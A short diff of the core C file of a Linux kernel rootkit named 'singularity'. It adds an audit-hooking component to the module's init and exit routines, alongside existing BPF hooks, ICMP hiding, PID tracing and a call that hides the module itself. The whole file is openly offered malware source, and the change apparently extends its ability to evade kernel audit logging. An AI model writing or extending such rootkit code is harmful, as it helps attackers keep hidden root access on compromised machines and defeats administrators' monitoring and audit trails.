@@ -14,6 +14,7 @@
 #include "include/bpf_hook.h"
 #include "include/icmp.h"
 #include "include/trace.h"
+#include "include/audit.h"
 
 /*
 You loaded the world's strongest rootkit into my heart... woman, you are so beautiful and gentle, you changed my life, I love you <3
@@ -37,6 +38,7 @@ static int __init singularity_init(void) {
     ret |= bpf_hook_init();
     ret |= hiding_icmp_init();
     ret |= trace_pid_init();
+    ret |= hooking_audit_init();
     module_hide_current(); // optional
     return ret;
 }
@@ -56,6 +58,7 @@ static void __exit singularity_exit(void) {
     bpf_hook_exit();
     hiding_icmp_exit();
     trace_pid_cleanup();
+    hooking_audit_exit();
 }
 
 module_init(singularity_init);
